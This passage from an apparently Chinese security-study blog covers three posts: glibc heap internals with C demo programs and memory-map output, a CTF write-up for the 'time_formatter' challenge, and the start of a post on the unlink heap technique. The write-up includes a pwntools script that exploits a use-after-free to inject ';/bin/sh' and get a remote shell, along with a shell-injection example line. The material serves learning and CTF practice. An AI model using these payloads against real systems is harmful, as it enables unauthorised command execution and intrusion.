class="built_in">printf</span>(<span class="string">&quot;After mmap\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Unmap mapped region. */</span></span><br><span class="line">        ret = munmap(addr, (<span class="keyword">size_t</span>)<span class="number">132</span>*<span class="number">1024</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret == <span class="number">-1</span>)</span><br><span class="line">                errExit(<span class="string">&quot;munmap&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After munmap\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><strong>在执行mmap之前</strong><br>我们可以从下面的输出看到，目前只有.so文件的mmap段。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6067/maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</span><br><span class="line">b7e21000-b7e22000 rw-p 00000000 00:00 0</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$</span><br></pre></td></tr></table></figure>
-<p><strong>mmap后</strong><br>从下面的输出可以看出，我们申请的内存与已经存在的内存段结合在了一起构成了b7e00000<br>到b7e21000的mmap段。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6067/maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</span><br><span class="line">b7e00000-b7e22000 rw-p 00000000 00:00 0</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$</span><br></pre></td></tr></table></figure>
-<p><strong>munmap</strong><br>从下面的输出，我们可以看到我们原来申请的内存段已经没有了，内存段又恢复了原来的样子。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6067/maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</span><br><span class="line">b7e21000-b7e22000 rw-p 00000000 00:00 0</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$</span><br></pre></td></tr></table></figure>
-<h3 id="多线程支持"><a href="#多线程支持" class="headerlink" title="多线程支持"></a>多线程支持</h3><p>在原来的dlmalloc实现中，当两个线程同时要申请内存时，只有一个线程可以进入临界区申请<br>内存，而另外一个线程则必须等待知道临界区中不再有线程。这是因为所有的线程共享一个<br>堆。在glibc的ptmalloc实现中，比较好的一点就是支持了多线程的快速访问。在新的实现<br>中，所有线程共享多个堆。</p>
-<p>这里给出一个例子。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Per thread arena example. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">threadFunc</span><span class="params">(<span class="keyword">void</span>* arg)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Before malloc in thread 1\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="keyword">char</span>* addr = (<span class="keyword">char</span>*) <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After malloc and before free in thread 1\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="built_in">free</span>(addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After free in thread 1\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">pthread_t</span> t1;</span><br><span class="line">        <span class="keyword">void</span>* s;</span><br><span class="line">        <span class="keyword">int</span> ret;</span><br><span class="line">        <span class="keyword">char</span>* addr;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Welcome to per thread arena example::%d\n&quot;</span>,getpid());</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Before malloc in main thread\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        addr = (<span class="keyword">char</span>*) <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After malloc and before free in main thread\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="built_in">free</span>(addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After free in main thread\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        ret = pthread_create(&amp;t1, <span class="literal">NULL</span>, threadFunc, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Thread creation error\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ret = pthread_join(t1, &amp;s);</span><br><span class="line">        <span class="keyword">if</span>(ret)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Thread join error\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><strong>第一次申请之前</strong>，没有任何堆段。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread</span><br><span class="line">Welcome to per thread arena example::6501</span><br><span class="line">Before malloc <span class="keyword">in</span> main thread</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">b7e05000-b7e07000 rw-p 00000000 00:00 0</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$</span><br></pre></td></tr></table></figure>
-<p>第一次申请后，从下面的输出可以看出，堆段被建立了，并且它就紧邻这数据段，这说明<br>malloc的背后是brk函数来实现的。同时，需要注意的是，我们虽然只是申请了1000个字节，<br>但是我们却得到了 0x0806c000-0x0804b000=0x21000 个字节的堆。这说明虽然程序只是<br>向操作系统申请很小的内存，但是为了方便，操作系统会把很大的内存分配给程序。这样的<br>话，就避免了多次内核态与用户态的切换，提高了程序的效率。我们称这一块连续的内存<br>区域为arena。此外，我们称由主线程申请的内存为main_arena。后续的申请的内存会一直<br>从这个arena中获取，直到空间不足。当arena空间不足时，它可以通过增加brk的方式来增加<br>堆的空间。类似的，arena也可以通过减小brk来缩小自己的空间。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread</span><br><span class="line">Welcome to per thread arena example::6501</span><br><span class="line">Before malloc <span class="keyword">in</span> main thread</span><br><span class="line">After malloc and before free <span class="keyword">in</span> main thread</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/lsploits/hof/ptmalloc.ppt/mthread$ cat /proc/6501/maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804b000-0806c000 rw-p 00000000 00:00 0          [heap]</span><br><span class="line">b7e05000-b7e07000 rw-p 00000000 00:00 0</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$</span><br></pre></td></tr></table></figure>
-<p>在主线程释放内存后，我们从下面的输出可以看出，其对应的arena并没有进行回收，而是<br>交由glibc来进行管理。当后面程序再次申请内存时，在glibc中管理的内存充足的情况下，<br>glibc就会根据堆分配的算法来给程序分配相应的内存。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread</span><br><span class="line">Welcome to per thread arena example::6501</span><br><span class="line">Before malloc <span class="keyword">in</span> main thread</span><br><span class="line">After malloc and before free <span class="keyword">in</span> main thread</span><br><span class="line">After free <span class="keyword">in</span> main thread</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/lsploits/hof/ptmalloc.ppt/mthread$ cat /proc/6501/maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804b000-0806c000 rw-p 00000000 00:00 0          [heap]</span><br><span class="line">b7e05000-b7e07000 rw-p 00000000 00:00 0</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$</span><br></pre></td></tr></table></figure>
-<p>在第一个线程malloc之前，我们可以看到并没有出现与线程1相关的堆，但是出现了与线程1<br>相关的栈。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread</span><br><span class="line">Welcome to per thread arena example::6501</span><br><span class="line">Before malloc <span class="keyword">in</span> main thread</span><br><span class="line">After malloc and before free <span class="keyword">in</span> main thread</span><br><span class="line">After free <span class="keyword">in</span> main thread</span><br><span class="line">Before malloc <span class="keyword">in</span> thread 1</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804b000-0806c000 rw-p 00000000 00:00 0          [heap]</span><br><span class="line">b7604000-b7605000 ---p 00000000 00:00 0</span><br><span class="line">b7605000-b7e07000 rw-p 00000000 00:00 0          [stack:6594]</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$</span><br></pre></td></tr></table></figure>
-<p>在第一个线程malloc后，我们可以从下面输出看出线程1的堆段被建立了。而且它所在的位<br>置为内存映射段区域，同样大小也是132KB(b7500000-b7521000)。因此这表明该线程申请<br>的堆时，背后对应的函数为mmap函数。同时，我们可以看出实际真的分配给程序的内存为<br>1M(b7500000-b7600000)。而且，只有132KB的部分具有可读可写权限，这一块连续区域<br>成为thread arena。</p>
-<p>注意：<br>当用户请求的内存大于128KB时，并且乜有任何arena有足够的空间时，那么系统就会执行<br>mmap函数来分配相应的内存空间。这与这个请求来自于主线程还是从线程无关。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread</span><br><span class="line">Welcome to per thread arena example::6501</span><br><span class="line">Before malloc <span class="keyword">in</span> main thread</span><br><span class="line">After malloc and before free <span class="keyword">in</span> main thread</span><br><span class="line">After free <span class="keyword">in</span> main thread</span><br><span class="line">Before malloc <span class="keyword">in</span> thread 1</span><br><span class="line">After malloc and before free <span class="keyword">in</span> thread 1</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804b000-0806c000 rw-p 00000000 00:00 0          [heap]</span><br><span class="line">b7500000-b7521000 rw-p 00000000 00:00 0</span><br><span class="line">b7521000-b7600000 ---p 00000000 00:00 0</span><br><span class="line">b7604000-b7605000 ---p 00000000 00:00 0</span><br><span class="line">b7605000-b7e07000 rw-p 00000000 00:00 0          [stack:6594]</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$</span><br></pre></td></tr></table></figure>
-<p>在第一个线程释放内存后，我们可以从下面的输出看到，这样释放内存同样不会把内存重新<br>给系统。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread</span><br><span class="line">Welcome to per thread arena example::6501</span><br><span class="line">Before malloc <span class="keyword">in</span> main thread</span><br><span class="line">After malloc and before free <span class="keyword">in</span> main thread</span><br><span class="line">After free <span class="keyword">in</span> main thread</span><br><span class="line">Before malloc <span class="keyword">in</span> thread 1</span><br><span class="line">After malloc and before free <span class="keyword">in</span> thread 1</span><br><span class="line">After free <span class="keyword">in</span> thread 1</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804b000-0806c000 rw-p 00000000 00:00 0          [heap]</span><br><span class="line">b7500000-b7521000 rw-p 00000000 00:00 0</span><br><span class="line">b7521000-b7600000 ---p 00000000 00:00 0</span><br><span class="line">b7604000-b7605000 ---p 00000000 00:00 0</span><br><span class="line">b7605000-b7e07000 rw-p 00000000 00:00 0          [stack:6594]</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$</span><br></pre></td></tr></table></figure>
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/06/14/%E5%A0%86%E6%A6%82%E8%BF%B0/" data-id="ckpxp8kbm0000cku6emm0h090" data-title="堆概述" class="article-share-link">分享</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-攻防世界堆溢出UAF-time-formatter" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/06/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%A0%86%E6%BA%A2%E5%87%BAUAF-time-formatter/" class="article-date">
-  <time class="dt-published" datetime="2021-06-12T23:34:03.000Z" itemprop="datePublished">2021-06-13</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/06/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%A0%86%E6%BA%A2%E5%87%BAUAF-time-formatter/">攻防世界堆溢出UAF_time_formatter</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h3 id="知识点1"><a href="#知识点1" class="headerlink" title="知识点1"></a>知识点1</h3><p>在linux shell中，假如有如下语句，这就是shell注入方面<br>echo “;ls;cat 1.txt;/bin/sh;”<br>则 ls 、cat 1.txt 、/bin/sh 这三个命令就会一次执行，这也是本题突破的关键</p>
-<h3 id="知识点2"><a href="#知识点2" class="headerlink" title="知识点2"></a>知识点2</h3><p>C语言或C++申请内存后，用free 或 delete 释放堆后，指针的值还在，如果不手动设置为<br>NULL，就可以被我们利用。</p>
-<p>堆内存的分配有规律，看如下代码：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">100</span>;i++) &#123;</span><br><span class="line">		<span class="keyword">char</span> *c = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(i);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;0x%x\n&quot;</span>,(<span class="keyword">long</span>)c);</span><br><span class="line">		<span class="built_in">free</span>(c);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;0x%x\n&quot;</span>,(<span class="keyword">long</span>)c);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>我们在Ubuntu上用gcc编译后运行此代码，输出的地址全部一样，这说明，当前一个堆释放<br>后，新创建的堆的地址就是前一个堆的地址。</p>
-<p>那么，我们来看题<br>①选项5退出时，释放了内存，但是并没有将指针设置为NULL，因此指针仍指向原来的那个地址<br><img src="/2021/06/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%A0%86%E6%BA%A2%E5%87%BAUAF-time-formatter/1.png" alt="1.png"><br>②选项4，有system，这里判断ptr是否为空，于是我们在退出时，选择不退出，这样我们释放了<br>第一个堆，然后我们在选项3中输入注入语句，创建的堆的地址就是第一个堆的地址，然后我们在<br>选项3中输入注入语句，创建的堆的地址就是第一个堆的地址，也就是Ptr的内容，最后再选择<br>4，执行getshell。这就是UAF（use after free）漏洞，通过UAF漏洞使得set_time_zone分配<br>得到的是set_format释放掉的内存。<br><img src="/2021/06/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%A0%86%E6%BA%A2%E5%87%BAUAF-time-formatter/2.png" alt="2.png"><br>这样，格式化字符串后的command就是<br>/bin/date -d @ “;/bin/sh”</p>
-<p>于是我们的脚本就这样写</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#sh = process(&#x27;./pwnh9&#x27;)</span></span><br><span class="line">sh = remote(<span class="string">&#x27;111.198.29.45&#x27;</span>,<span class="number">57042</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;test&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Are you sure you want to exit (y/N)?&#x27;</span>,<span class="string">&#x27;N&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Time zone:&#x27;</span>,<span class="string">&quot;&#x27;;/bin/sh&#x27;&quot;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/06/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%A0%86%E6%BA%A2%E5%87%BAUAF-time-formatter/" data-id="ckpvd5y1f0000f8u6dmj11jr5" data-title="攻防世界堆溢出UAF_time_formatter" class="article-share-link">分享</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Unlink" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/06/11/Unlink/" class="article-date">
-  <time class="dt-published" datetime="2021-06-11T16:17:03.000Z" itemprop="datePublished">2021-06-12</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/06/11/Unlink/">Unlink</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h1><p>我们在利用unlink所造成的漏洞是，其实就是对chunk进行内存布局，然后借助unlink操作<br>来达成修改指针的效果。</p>
-<p>我们先来简单回顾一下unlink的目的与过程，其目的是把一个双向链表中的空闲块拿出来<br>（例如free时和目前物理相邻的free chunk进行合并）。其基本的过程如下：<br><img src="/2021/06/11/Unlink/1.png" alt="1.png"><br>下面我们首先介绍一下unlink最初没有防护时的利用方法，然后介绍目前利用Unlink的方式。</p>
-<h3 id="古老的unlink"><a href="#古老的unlink" class="headerlink" title="古老的unlink"></a>古老的unlink</h3><p>最初unlink实现的时候，其实是没有对chunk的size检查和双向链表检查的，即没有如下检查<br>代码。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致(size检查)</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      \</span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);               \</span><br><span class="line"><span class="comment">// 检查 fd 和 bk 指针(双向链表完整性检查)</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      \</span><br><span class="line">  malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span><br><span class="line"></span><br><span class="line">  <span class="comment">// largebin 中 next_size 双向链表完整性检查 </span></span><br><span class="line">              <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)              \</span><br><span class="line">                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    \</span><br><span class="line">              malloc_printerr (check_action,                                      \</span><br><span class="line">                               <span 